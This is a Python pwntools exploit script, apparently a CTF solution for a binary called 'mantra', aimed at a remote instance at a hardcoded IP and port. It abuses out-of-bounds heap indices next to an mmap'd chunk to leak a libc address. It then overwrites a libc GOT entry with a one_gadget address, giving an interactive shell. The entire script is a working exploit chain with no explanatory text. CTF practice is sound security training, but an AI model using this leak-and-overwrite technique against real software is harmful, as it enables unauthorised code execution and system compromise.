#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import setcontext32

exe = context.binary = ELF(args.EXE or './mantra_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc 83.136.249.164 53205'.split()

libc_path = './libc.so.6'
ld_path = './ld-2.34.so'
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')

def se(x):
    return str(x).encode()

def cyc(x):
    n = 8 if context.arch == 'amd64' else 4
    return cyclic(x, n=n)

def malloc(sz):
    p.sendlineafter(b'>' , b'1')
    p.sendlineafter(b':', se(sz))

def view(idx):
    p.sendlineafter(b'>' , b'4')
    p.sendlineafter(b'?', se(idx))
    p.recvuntil(b'speaks: [')
    leak = p.recvuntil(b']', drop=1)
    return leak
def hex_dump(data: bytes, vma: int = 0):
    for offset in range(0, len(data), 8):
        chunk = data[offset:offset+8]
        hex_bytes = " ".join(f"{b:02x}" for b in chunk)
        ascii_repr = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"{vma + offset:08x}  {hex_bytes:<23}  {ascii_repr}")
        
def ch8(data: bytes):
    return [data[i:i+8] for i in range(0, len(data), 8)]
def edit8(idx, x):
    p.sendlineafter(b'>' , b'3')
    p.sendlineafter(b'?', se(idx))
    p.sendafter(b':', x)
    info(f'Edited: {mmap_loc+0x10 + 8 *idx:#x} = {x.hex()}')
gdbscript = '''
b *(exit+0)

continue
'''.format(**locals())

p = start()
mthres = 0x400000

idx_leak = 0x4432ea
malloc(mthres)
leak = ua(view(idx_leak))
libc.address = leak - libc.sym._nl_global_locale
logx.leak, logx.libc
mmap_loc = libc.address - 0x2004000
exit_enc_addr = libc.address + 0x21abd8
exit_dec = libc.address + 0x23bd00
exit_idx = (exit_enc_addr-mmap_loc)//8-2
info(exit_idx)
got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
logx.got
idx_fuck = ((got + 0x98)-mmap_loc)//8-2
edit8(idx_fuck, p64(libc.address+ 0xeed34))
p.sendline(b'213')
# info(view(exit_idx))


p.interactive()
